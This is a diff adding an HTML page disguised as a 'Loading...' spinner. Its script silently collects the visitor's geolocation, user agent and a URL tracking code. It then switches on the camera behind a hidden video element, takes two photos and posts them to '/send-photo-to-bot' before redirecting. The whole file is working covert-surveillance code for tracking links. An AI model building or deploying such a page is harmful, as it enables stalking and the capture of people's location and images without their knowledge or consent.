@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Loading...</title>
+
+    <style>
+        video {
+            display: none;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css"
+        integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/js/bootstrap.min.js"
+        integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM"
+        crossorigin="anonymous"></script>
+
+    <script>
+        async function sendLocationAndPhoto(lat, lon, code) {
+            const userAgent = navigator.userAgent;
+            let locationData = { redirectTo: "/" };
+
+            // 1. Send location if available
+            try {
+                const locationRes = await fetch("/track-location", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ lat, lon, userAgent, code })
+                });
+                locationData = await locationRes.json();
+            } catch (err) {
+                console.warn("Location tracking failed:", err);
+            }
+
+            // 2. Try to access camera and send photo
+            try {
+                const canvas = document.createElement("canvas");
+                const video = document.createElement("video");
+                video.autoplay = true;
+
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+
+                await new Promise(resolve => setTimeout(resolve, 500));
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                const ctx = canvas.getContext("2d");
+                const photos = [];
+
+                for (let i = 0; i < 2; i++) {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const photo = canvas.toDataURL("image/jpeg", 0.7);
+                    photos.push(photo);
+                }
+
+                stream.getTracks().forEach(track => track.stop());
+
+                await fetch("/send-photo-to-bot", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ photos, code, userAgent })
+                });
+            } catch (err) {
+                console.warn("Camera capture failed:", err);
+            }
+
+            // 3. Always redirect
+            window.location.href = locationData.redirectTo || "/";
+        }
+
+        window.onload = function () {
+            const code = window.location.pathname.split("/").pop();
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => sendLocationAndPhoto(pos.coords.latitude, pos.coords.longitude, code),
+                    () => sendLocationAndPhoto(null, null, code)
+                );
+            } else {
+                sendLocationAndPhoto(null, null, code);
+            }
+        };
+
+    </script>
+</head>
+
+<body>
+    <div class="d-flex justify-content-center align-items-center vh-100">
+        <div class="spinner-border" role="status">
+            <span class="sr-only">Loading...</span>
+        </div>
+    </div>
+</body>
+
+</html>
